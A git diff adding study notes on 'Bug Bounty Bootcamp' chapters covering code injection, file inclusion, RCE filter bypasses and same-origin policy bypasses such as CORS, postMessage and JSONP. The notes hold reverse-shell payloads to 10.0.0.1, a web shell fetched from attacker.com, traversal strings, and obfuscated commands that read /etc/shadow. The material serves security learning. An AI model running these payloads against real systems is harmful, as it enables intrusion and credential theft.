@@ -23,6 +23,8 @@
 - [Chapter 16: Template Injection](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-16-template-injection)
 - [Chapter 17: Application Logic Errors and Broken Access Control](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-17-application-logic-errors-and-broken-access-control)
 - [Chapter 18: Remote Code Execution](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-18-remote-code-execution)
+- [Chapter 19: Same-Origin Policy Vulnerabilities](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-19-same-origin-policy-vulnerabilities)
+- [Chapter 20: Single-Sign-On Security Issues](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-20-single-sign-on-security-issues)
 
 ### Chapter 1: Picking a Bug Bounty Program
 
@@ -3981,5 +3983,484 @@ Note: This chapter seems pretty light it comparison to the last. There is a lot 
 "Sometimes attackers can achieve RCE by injecting malicious code directly into executed code. These are _code injection vulnerabilities_. Attackers can also achieve RCE by putting malicious code into a file executed or included by the victim application, vulnerabilities called _file inclusions_" - I was writing about file inclusions in the last chapter when I mentioned how to get a reverse shell.
 
 **Code Injection**
+
+- Code injection vulns occur when applications allow user input to be confused with executable code.
+  - Can be unintentional where the application passes unsanitized data into executed code.
+  - It could also be build into the app as a feature.
+- ex. Python calculator:
+
+  ```
+  def calculate(input):
+    return eval("{}".format(input))
+
+  result = calculate(user_input.calc)
+  print("The result is {}.".format(result))
+  ```
+
+  - Users can interact with this script using the GET request:
+
+  ```
+  GET /calculator?calc=1+2
+  Host: example.com
+  ```
+
+  - The calculator app takes user-provided input and executes it as Python code. Uh-oh.
+
+  ```
+  GET /calculator?calc="__import__('os').system('ls')"
+  Host: example.com
+  ```
+
+  - Unlike with the frameworks in the previous chapter where we had to find a way to import `os` in order to run system commands, this script has no such protections and so you can execute commands by importing the `os` module without much effort.
+  - ex. Reverse shell through calculator app:
+
+  ```
+  GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
+  Host: example.com
+  ```
+
+  - This reverse shell script will connect back to the attackers fictional IP address at 10.0.0.1 over port 8080.
+
+- ex. example.com has a functionality that allows you to download a remote file and view it on the website.
+
+  ```
+  import os
+
+  def download(url):
+    os.system("wget -O- {}".format(url))
+
+  display(download(user_input.url))
+  ```
+
+  - `wget` is used to download web pages given a URL.
+  - `-O-` option makes wget download the file and display the standard output.
+  - In linux systems, the semicolon (;) separates individual commands.
+  - This above script requires you to use wget for something, however, after passing a URL to satisfy this condition, you can use a semicolon to inject additional code:
+
+  ```
+  GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>1"
+  Host: example.com
+  ```
+
+_File Inclusion_
+
+"Most programming languages have functionality that allows developers to _include_ external files to evaluate the code contained within. This is useful when developers want to incorporate external asset files like images into their applications, make use of external code libraries, or reuse code that is written for a different purpose."
+
+- _file inclusion vulnerabilities_ have two subtypes: Remote file inclusion, and Local file inclusion.
+  - _Remote File Inclusion_ occurs when the application allows arbitrary files from a remote server to be included.
+    - This happens when applications dynamically include external files and scripts on their pages and use user input to determine the location of the included file.
+- ex. A vulnerable PHP application that calls the `include` function on the value of the user-submitted HTTP GET parameter `page`:
+
+  ```
+  <?php
+    // Some PHP code
+    $file = $_GET["page"];
+    include $file;
+
+    // Some PHP code
+  ?>
+  ```
+
+  - This code allows users to access the various pages of th website by changing the `page` parameter.
+    - ex. `http://example.com/?page=index.php` or `http://example.com/?page=about.php`
+  - If the app doesn't limit which file the user includes with the `page` parameter, an attacker can include a malicious .php file hosted on their server and get that page executed by the target server.
+    - ex. basic malicious php file for remote code execution (basic-RCE.php):
+    ```
+    <?PHP
+      system($_GET["cmd"])
+    ?>
+    ```
+    - If the target loads this page on example.com, the site will evaluate the code contained in `basic-RCE.php`, located on the attacker's server.
+    - ex. How you pass the command to the file through the web browser:
+      `http://example.com/?page=http://attacker.com/basic-RCE.php?cmd=ls`
+    - This feature is also vulnerable to SSRF and XSS.
+      - It's vulnerable to SSRF because the page could load info about the local system and network.
+      - Attackers could also make the page load a malicious JavaScript file and trick the user into clicking it to execute a reflected XSS attack.
+
+- _Local file inclusion_ occurs when applications include files in an unsafe way, but the inclusion of remote files isn't allowed.
+
+  - To exploit this, attackers need to upload a malicious file to the target machine/server and then execute it by using local file inclusion.
+  - ex. A PHP file that gets the HTTP GET parameter `page` and then calls the PHP `include` function after concatenating `page` with a directory name containing the files users can load:
+
+  ```
+  <?php
+    // Some PHP code
+    $file = $_GET["page"];
+    include "lang/".$file;
+
+    // Some PHP code
+  ?>
+  ```
+
+  - `lang/` directory contains the websites different homepages based on language.
+    - ex. `http://example.com/?page=de-index.php` (German) and `http://example.com/?page=en-index.php` (English)
+  - The `lang/` directory and files are located on the server at: `/var/www/html/lang/en-index.php`
+    - (Not in the Book) The structure of these directories can change depending on the server:
+      - Apache defaults to `/var/www/...`
+      - Nginx defaults to `/var/www/html/...`
+      - lighttpd defaults to `/var/www/...`
+      - These directory structures can also be changed in the configuration files for the web server.
+      - Knowing how these structures work and where certain information might be found can help you once you've gotten a reverse shell or creds for a system to sleuth through potentially sensitive documents for additional endpoints, credentials, sql server information, etc.
+        - This is useful when you have a connection to the internal system through an unprivileged user (like `www-data`) and are going for root.
+  - ex. example.com allows users to upload files of any file type, then stores them in the `/var/www/html/uploads/USERNAME` directory.
+    - The attacker could upload a malicious PHP file to the uploads folder then use the ../../../ sequence to escape out of the `lang` directory and execute the malicious upload file on the target server:
+      `http://example.com/?page=../../../../var/www/html/uploads/USERNAME/malicious.php`
+    - When the website loads the malicious.php file, its contents will should be executed.
+
+**Prevention**
+
+"To prevent code injections, you should avoid inserting user input into code that gets evaluated. Also, since user input can be passed into evaluated code through files that are parsed by the application, you should treat user uploaded files as untrusted, as well as protect the integrity of existing system files that your programs execute, parse, or include."
+
+- Avoid including files based on user input.
+  - If that's not possible, disallow the inclusion of remote files and create an allowlist of local files that your programs can include.
+- Limit file uploads to certain 'safe' file types and host uploaded files in a separate environment than the application's source code.
+- Avoid calling system commands directly and use the programming language's system APIs instead.
+  - ex. PHP has a function named `mkdir(DIRECTORY_NAME)` that can be used instead of calling `system("mkdir DIRECTORY_NAME")`
+- Implement strong input validation for input passed into dangerous functions like `eval()` or `include()`
+  - This is a weak defence, but something is better than nothing.
+- Patch regularly and often.
+  - An application's dependencies, such as open source packages and components, often introduce vulnerabilities into an application.
+    - This is called a _software supply chain attack_, which is where you go after outdated or insecure dependencies instead of the application itself.
+- Use a _web application firewall (WAF)_ to block suspicious traffic.
+  - This can help with SQL injection and XSS as well.
+- Use least privilege to ensure that if you are compromised, the attacker doesn't get full run of the system.
+
+**Hunting for RCE's**
+
+"Like many of the attacks we've covered thus far, RCEs have two types: classic and blind. _Classic RCEs_ are the ones in which you can read the results of the code execution in a subsequent HTTP response, whereas _blind RCEs_ occur when the malicious code is executed but the returned values of the execution do not appear in any HTTP response. Although attackers cnnot witness the results of their executions, blind RCE's are just as dangerous as classic RCEs because they can enable attackers to spawn reverse shells or exiltrate data to a remote server..."
+
+- Commands to use when attacking linux servers: `whoami`, `sleep 5`
+  - `whoami` is good to use with classic RCE attacks as it will display the name of the user e.g: `www-data`.
+  - `sleep 5` is good to use with a blind RCE. If it takes 5 seconds for the response, you will know that the command was successful.
+
+_Step 1: Gather Information About the Target_
+
+- Find out information about the web sever, programming language, and other technologies used by the target.
+  - [Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance) has information on this.
+
+_Step 2: Identify Suspicious User Input Location_
+
+- Take note of every direct user-input location: URL parameters, HTTP headers, body parameters, and file uploads...
+  - Sometimes applications parse user-supplied files and concatenate their contents unsafely into executed code, so any input that is eventually passed into commands is something you should look for.
+- Find potential file inclusion vulns by checking for input locations being used to determine filenames or paths, as well as any file-upload functionalities.
+
+_Step 3: Submit Test Paylods_
+
+_Python payloads:_
+
+- `print("RCE test")`
+- `"__import__('os').system('ls')"`
+- `"__import__('os').system('sleep 10')"`
+
+_PHP payloads_
+
+- `phpinfo();`: prints local PHP configuration information.
+- `<?php system("ls");?>`
+- `<?php system("sleep 10");?>`
+
+_Unix payloads_
+
+- `;ls;`
+- `| sleep 10;`
+  `& sleep 10;`
+  \`sleep 10;\` <- not easy to format in markdown...
+  `$(sleep 10)`
+
+- For file inclusion vulnerabilities, you should try to make the endpoint include either a remote file or a local file that you can control.
+  - ex. try several forms of a URL that point to your malicious file hosted offsite:
+    `http://example.com/?page=http://attacker.com/malicious.php`
+    `http://example.com/?page=http:attacker.com/malicious.php`
+  - ex. for local file inclusion:
+    `http://example.com/?page=../uploads/malicious.php`
+    `http://example.com/?page=..%2fuploads%2fmalicious.php.`
+
+_Step 4: Confirm the Vulnerability_
+
+- Confirm the vulnerability by executing harmless commands like `whoami`, `ls,`, and `sleep 10`.
+
+**Escalating the Attack**
+
+- Most companies would prefer you don't escalate RCEs because they don't want you poking around inside their systems that contain confidential information.
+- In a penetration test, attackers will start to engage in privilege escalation in attempts to obtain root access.
+- In a bug bounty program this is not appropriate.
+
+  - Read the bug bounty rules to make sure you don't cross a line resulting in real legal trouble.
+
+- Create _Proof of Concepts (POCs)_ that execute a harmless command like `whoami`, `ls`, that read the `/etc/password` file using the `cat` command, or create a file with the `touch` command that identifies you and says you've used an RCE to drop the file (`touch rce_by_YOUR_NAME`).
+  - the `/etc/passwd` file doesn't contain actual passwords, it contains the system's accounts, user IDs, group IDs, home directories, and default shells.
+- For blind RCE's create a POC that executes the sleep command and show the subsequent response with it's delay matching that of the sleep command. If it's allowed, you could demonstrate a reverse shell instead.
+
+**Bypassing RCE Protection**
+
+- Basic input validation bypasses you can try if the app is blocking your payloads:
+  - The following will all print the `/etc/shadow` files contents:
+  - `cat /etc/shadow`
+  - `cat "/e"tc'/shadow'`
+  - `cat /etc/sh*dow`
+  - cat /etc/sha``dow
+  - `cat /etc/sha$()dow`
+  - `cat /etc/sha${}dow`
+- Vary the way you write the command in PHP. PHP allows you to concatenate function names as strings. You can even hex-encode function names, or insert PHP comments in commands without changing their outcome:
+  - `('sys'.'tem')('cat /etc/shadow');`
+  - `system/**/('ls');`
+    - `/* Text inside these slash asterix are comments */`
+  - `\x73\x79\x73\x74\x65\x6d'('ls');`
+- The following are all equivalent in python syntax:
+  - `__import__('os').systen('cat /etc/shadow')`
+  - `__import__('o'+'s').system('cat /etc/shadow')`
+  - `__import__('\x6f\x73').system('cat /etc/shadow')`
+- Some servers concatenate the values of multiple parameters that have the same name into a single value. If this is the case, you can split malicious code into chunks to bypass input validation.
+  - ex. The firewall blocks requests that contain the string `system`:
+  ```
+  GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
+  Host: example.com
+  ```
+  - The parameters will get through the firewall without issue since the request technically doesn't contain the string `system`.
+- If you want more examples, the book suggests searching online for RCE filter bypass or WAF bypass.
+
+**Finding Your First RCE!**
+
+1. Identify suspicious user-input locations. For code injections, take note of every user-input location, including URL parameters, HTTP headers, Body parameters, and file uploads. To find potential file inclusion vulnerabilities, check for input locations being used to determine or construct filenames and for file-upload functions.
+2. Submit test payloads to the input locations in order to detect potential vulnerabilities.
+3. If your requests are blocked, try protection-bypass techniques and see if your payload succeeds.
+4. Finally, confirm the vulnerability by trying to execute harmless commands such as `whoami`, `ls`, and `sleep 10`.
+5. Avoid reading sensitive system files or altering any files with the vulnerability you've found.
+6. Submit your first RCE report to the program.
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 19: Same-Origin Policy Vulnerabilities
+
+"...The \[Same Origin Policy] (SOP) restricts how a script originating from one site can interact with the resources of a different site, and it's critical in preventing many common web vulnerabilities... Websites often loosen the SOP in order to have more flexibility. These controlled and intended SOP bypasses can have adverse effects, as attackers can sometimes exploit misconfigurations in these techniques to bypass the SOP. These exploits can cause private information leaks and often lead to more vulnerabilities, such as authentication bypass, account takeover, and large data breaches."
+
+**Mechanisms**
+
+- How an SOP works:
+  - A script from page A can access data from page B only if the pages are on the same origin.
+  - Two URLs are said to have the _same origin_ if they share the same protocol, hostname, and port number.
+- Modern web apps often base their authentication on HTTP cookies, and server take action based on the cookies included automatically by the browser.
+  - This makes the SOP especially important.
+  - When SOP is implemented, malicious web pages won't be able to take advantage of the cookies stored in your browser to access your private information.
+- The SOP is often too restrictive for modern web apps because they have multiple subdomains, or multiple domains and these different domains and subdomains wouldn't be able to share information if they followed the policy.
+
+  - Because the SOP is inflexible, most websites find ways to relax it, and this is where they become vulnerable.
+
+- ex. You find out that `a.example.com passes` information to `b.example.com` via SOP bypass techniques.
+  - if you can find out the technique used and exploit it, you might be able to steal the victim's private information on the banking site.
+  - The simplest way for websites to work around the SOP is to change the origin of a page via JavaScript. This is done by setting the origin of two pages to the same domain using `document.domain` in the pages' JavaScript as this will enable the pages to share resources.
+  - You can set the domain of both `a.example.com` and `b.example.com` so that they can interact:
+    `document.domain = "example.com"`
+    - You can only set the `document.domain` of a page to a superdomain.
+      - You can set `a.example.com` to `example.com`, but not `example2.com`.
+
+_Exploiting Cross-Origin Resource Sharing_
+
+- Many sites use Cross-Origin Resource Sharing (CORS) to relax the SOP instead.
+  - CORS allows servers to explicitly specify a list of origins that are allowed to access its resources via the HTTP response header `Access-Control-Allow-Origin`.
+- ex. We want to send the following JSON blob located at `a.example.com/user_info` to `b.example.com`.
+  `{"username": "vickieli", "account_numer": "12345"}`
+  - Under the SOP, this won't work because the source and destination are different under the SOP.
+  - Using CORS, the user's browser will send an `Origin` header on behalf of `b.example.com`:
+    `Origin: https://b.example.com`
+  - If `b.example.com` is part of an allowlist of URLs with permission to access resources on `a.example.com`, `a.example.com` will send the browser the requested resource along with an `Access-Control-Allow-Origin` header:
+    `Access-Control-Allow-Origin: https://b.example.com`
+  - The application can also return the `Access-Control-Allow-Origin` header with a wildcard (\*) to indicate that the resource on that page can be accessed by any origin.
+    -If the origin of the requesting page isn't allowed to access the resource, the user's browser will block the rquesting page from reading the data.
+- CORS is great, but it is only safe when the list of allowed origins is properly defined.
+  - If CORS is misconfigured, attackers can exploit the misconfiguration and access the protected resources.
+- The most basic misconfiguration of CORS involves allowing the `null` origin.
+  - If the server sets `Access-Control-Allow-Origin` to `null`, the browser will allow any site with a `null` origin header to access the resource.
+  - Any origin can create a request with a `null` origin, for instance, a cross-origin request generated from a document using the `data:` URL scheme will have a null origin.
+- Another common misconfiguration is to set the `Access-Control-Allow-Origin` header to the origin of the requesting page without validating the requester's origin.
+  - If the server doesn't validate the origin and returns an `Access-Control-Allow-Origin` for any origin, the header will completely bypass the SOP, removing all limitations on cross-origin communication.
+    `Access-Control-Allow-Origin: null`
+    `Access-Control-Allow-Origin: https://attacker.com`
+- Weak regexes that validate origins can also lead to vulnerabilities.
+  - If the policy checks only if an origin URL starts with `www.example.com`, an attacker can bypass the filter by using an origin like `www.example.com.attacker.com`
+- If you set the `Access-Control-Allow-Origin: *` and a client sends a request with credentials to the page, the browser (client) will raise an error and won't allow the client to read the response.
+- Protects against CORS misconfigurations by creating a well defined CORS policy with strict allowlist and robust URL validation.
+  - For pages containing sensitive information, the server should return the requesting page's origin in the `Access-Control-Allow-Origin` header only if that origin is in the allowlist. For public information, the server can simply use the wildcard designation for `Access-Control-Allow-Origin`.
+
+_Exploiting postMessage()_
+
+- Sites can use `postMessage()` to work around SOP.
+- This method is a web API that uses JavaScript syntax and is used to send messages to another window:
+  `RECIPIENT_WINDOW.postMessage(MESSAGE_TO_SEND, TARGET_ORIGIN);`
+- The receiving window handles the message by using an event handler that will be triggered when the receiving window receives a message:
+  `window.adEventListener("message",EVENT_HANDLER_FUNCTION);`
+- `postMessage()` requires the sender to obtain a reference to the receiver's window so messages can only be sent between a widnwo and its iframes or pop-ups.
+  - This is because only windows that open each other will have a way to reference each other.
+  - A window can use `window.open` to refer to a new window it opened.
+  - It can also user `window.opener` to reference the window that spawned the current window.
+  - It can use `window.frames` to reference embedded iframes, and `window.parent` to reference the parent window of the current iframe.
+- Say we're trying to pass the following JSON blob located at `a.example.com/user_info` to `b.example.com`
+  `{'username': 'vickieli', 'account_number': '12345'}`
+  - `a.example.com` can open `b.example.com` and send a message to its window. The `window.open()` function opens the window of a particular URL and returns a reference to it:
+  ```
+  var recipient_window = window.open("https://b.example.com", b_domain)
+  recipient_window.postMessage("{'username': 'vikieli', 'account_number': '12345'}", "*");
+  ```
+  - At the same time, `b.example.com` would set up an event listener to process the data is receives:
+  ```
+  function parse_data(event) {
+    // Prase the data
+  }
+  window.addEventListener("message", parse_data);
+  ```
+  - `postMessage()` does not bypass SOP directly but provides a way for pages of different origins to send data to each other.
+  - For this to be secure, both the sender and the receiver of the message should verify the origin of the other side.
+    - Vulns occur when pages enforce weak origin checks or lack origin checks altogether.
+- If the sender page doesn't specify a target origin and uses a wildcard target origin instead, it becomes possible to leak information to other sites:
+  `RECIPIENT_WINDOW.postMessage(MESSAGE_TO_SEND, *);`
+  - In this case, an attacker can create a malicious HTML page that listens for events coming from the sender page. They can then trick users into triggering the `postMessage()` by using a malicious link or fake image and make the victim page send data to the attacker's page.
+    - To prevent this, devs should always set the `TARGET_ORIGIN` parameter to the target site's URL instead of using a wildcard origin.
+    ```
+    recipient_window.postMessage(
+    "{'username': 'vickieli', 'account_number': '12345'}", "https://b.example.com");
+    ```
+- On the other hand, if the message receiver doesn't validate the page where the `postMessage()` is coming from, it becomes possible for attackers to send arbitrary data to the website and trigger unwanted actions on the victim's behalf.
+
+  - If `b.example.com` allows `a.example.com` to trigger a password change based on a `postMessage()` like this:
+
+  ```
+  recipient_window.postMessage(
+  "{'action': 'password_change'< 'username': 'vickieli', 'new_password': 'password'}", "https://b.example.com");
+  ```
+
+  - The page `b.example.com` would then receive the message and process the request:
+
+  ```
+  function parse_data(event) {
+    // if "action" is "password_change", change the user's password
+  }
+  window.addEventListener("message", parse_data);
+  ```
+
+  - Notice that a window can send messages to `b.example.com`, so any page can initiate a password change on `b.example.com`!
+  - To exploit this, the attack can embed or open the victim page to obtain its window reference, then they're free to send arbitrary messages to that window.
+  - To prevent this, pages should verify the origin of the sender of a message before processing it:
+
+  ```
+  function parse_data(event) {
+    if (event.origin == "https://a.example.com"){
+
+      // If "action" is "password_change", change the user's password
+    }
+  }
+  window.addEventListener("message", parse_data);
+  ```
+
+_Exploiting JSON with Padding_
+
+"_JSON with Padding (JSONP)_ is another technique that works around the SOP. It allows the sender to send JSOn data as JavaScript code. A page of a different origin can read the JSOn data by processing the JavaScript."
+
+- Continuing the example from before of trying to pass a JSON blob from `a.example.com/user_info` to `b.example.com`:
+- The SOP allows the HTML `<script>` tag to load scripts across origins, so an easy way for `b.example.com` to retrieve data across origins is to load the data as a script in a `<script>` tag:
+  `<script src="https://a.example.com/user_info"></script>`
+
+  - `b.example.com` would essnetially be including the JSON data block in a script tag, but this would cause a syntax error because JSON data is not valid Javascript.
+  - JSON works around this issue by wrapping the data in a JavaScript function and sending the data as JavaScript code instead of a JSON file.
+  - The requesting page includes the resource as a script and specifies a callback function, typically in a URL parameter name `callback` or `jsonp`.
+  - This callback function is a predefined function on the receiving page ready to process the data:
+    `script src="https://a.example.com/user_info?callback=parseinfo"></script>`
+  - The page at `a.example.com` will returnt he data wrapped in the specified callback function:
+    `parseinfo({"username": "vickieli", "account_number": "12345"})`
+  - The receiving page would essentially be including this script, which is valid JavaScript code:
+
+  ```
+  <script>
+    parseinfo({"username": "vickieli", "account_number": "12345"})
+  </script>
+  ```
+
+  - The receiving page can then extract the data by running the JavaScript code and processing the `parseinfo()` function. By sending data as scripts instead of JSON data, JSONP allows resources to be read across origins.
+  - Summary:
+    1. The data requester includes the data's URL in a script tag, along with the name of a callback function.
+    2. The data provider returns the JSON data wrapped within the specified callback function.
+    3. The data requester receives the function and processes the data by running the returned JavaScript code.
+
+- Find out if a site uses JSONP by looking for script tags that include URLs with the terms `jsonp` or `callback`.
+- JSONP comes with risks, when it;s enabled on an endpoint, an attacker can simply embed the same script tag on their site and request th data wrapped in the JSONP payload:
+  `<script src="https://a.example.com/user_info?callback=parseinfo"></script>`
+  - If a user is browsing the attacker's site while logged into `a.example.com` at the same time, the user's browser will include their credentials in the request and allow attackers to extract confidential data belonging to the victim.
+  - Because of this JSONP is only suitable for transmitting public data.
+    - You could secure it further with CSRF tokens or an allowlist of referrer headers for JSONP requests, but they may be able to be bypassed.
+  - With JSONP, site `b.example.com` need to trust site `a.example.com` completely, as it's running arbitrary JavaScript from `a.example.com`. That includes trusting it to never be compromised.
+  - Sites more often use CORS than they do JSONP.
+
+_Bypassing SOP by Using XSS_
+
+- XXS is essentially a full SOP bypass because any JavaScript run on a page operates under the security context of that page.
+
+**Hunting for SOP Bypasses**
+
+_Step 1: Determine If SOP Relaxation Techniques are Used_
+
+- When you're browsing the web app, open your proxy and look for any signs of cross-origin communication.
+  - For example, CORS sites will often return HTTP responses that contain an `Access-Control-Allow-Origin` header.
+  - A site could be using `postMessage()` if you inspect a page (for example, right-clicking it in Chrome and choosing **Inspect**, then navigating to **Event Listeners**) and find a `message` event listener.
+  - A site could be using JSONP if you see a URL being loaded in a `<script>` tag with a callback function:
+    `<script src="https://a.example.com/user_info?callback=parseinfo"></script>`
+    `<script src="https://a.example.com/user-info?jsonp=parseinfo"></script>`
+
+_Step 2: Find CORS Misconfiguration_
+
+- Check whether the `Access-Control-Allow-Origin` response header is set to null.
+- If not, send a request to the site with the origin header `https://attacker.com` with your proxy, and see if the `Access-Control-Allow-Origin` in the response is set to `https://attacker.com`
+- Test whether the site properly validates the origin URL by submitting an Origin header that contains an allowed site, such as `https://www.example.com.attacker.com` then check if the `Access-Control-Allow-Origin` header returns the origin of the attacker's domain.
+
+_Step 3: Find postMessage Bugs_
+
+- If the site uses `postMessage`, see if you can send or receive messages as an untrusted site.
+  - Create an HTML page with an iframe that frames the targeted page accepting messages.
+  - Try to send messages to that page that trigger a state-changing behavior.
+  - If the target cannot be framed, open it as a new window instead:
+  ```
+  var recipient_window = window.open("https://TARGET_URL", target_domain)
+  recipient_window.postMessage("RANDOM MESSAGE", "*");
+  ```
+  - Create an HTML page that listens for events coming from the target page, and trigger the postMessage from the target site. See if you can receive sensitive data from the target page.
+  ```
+  var recipient_window = window.open("https://TARGET_URL", target_domain)
+
+  function parse_data(event) {
+    // Run some code if we receive data from the target
+  }
+  window.addEventListener("message", parse_data);
+  ```
+
+_Step 4: Find JSONP issues_
+
+- If the site uses JSONP, see if you can embed a srcipt tag on your site and request the sensitive data wrapped in the JSONP payload:
+  `<script src="https://TARGET_URL?callback=parseinfo"></script>`
+
+_Step 5: Consider Mitigating Factors_
+
+"When the target site does not rely on cookies for authentication, these SOP bypass misconfigurations might not be exploitable. For instance, when the site sues custom headers or secret request parameters to authenticate requests, you might need to find a way to forge those to exfiltrate sensitive data."
+
+**Escalating the Attack**
+
+- SOP bypass bugs are often already considered high severity because you can access users private information or execute actions as other users.
+- Consider the following if you want to escalate further:
+  - Can you harvest large amounts of user data by automating the exploitation of the SOP bypass?
+  - Can you use the information you've harvested to cause more damage?
+  - Can you extract security questions?
+  - Consider the impact of the issue before sending the report.
+    - For instance, if a publicly readable page is served with a null `Access-Control-Allow-Origin` header, it would not cause damage since it doesnt contain any sensitive information.
+  - A good SOP-bypass report will include potential attack scenarios and indicate how attackers can exploit the vulnerability.
+    - What data can the attacker steal, and how easy would it be?
+
+**Finding Your First SOP Bypass Vulnerability**
+
+1. Find out if the application uses any SOP relaxation techniques. Is the application using CORS, `postMessage`, or JSONP?
+2. If the site is using CORS, test the strength of the CORS allowlist by submitting test `Origin` headers.
+3. If the site is using `postMessage`, see if you can snd or receive messages as an untrusted site.
+4. If the site is using JSONP, try to embed a script tag on your site and request the sensitive data wrapped in the JSONP payload.
+5. Determine the sensitivity of the information you can steal using the vulnerability, and see if you can do something more.
+6. Submit it!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 20: Single-Sign-On Security Issues
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
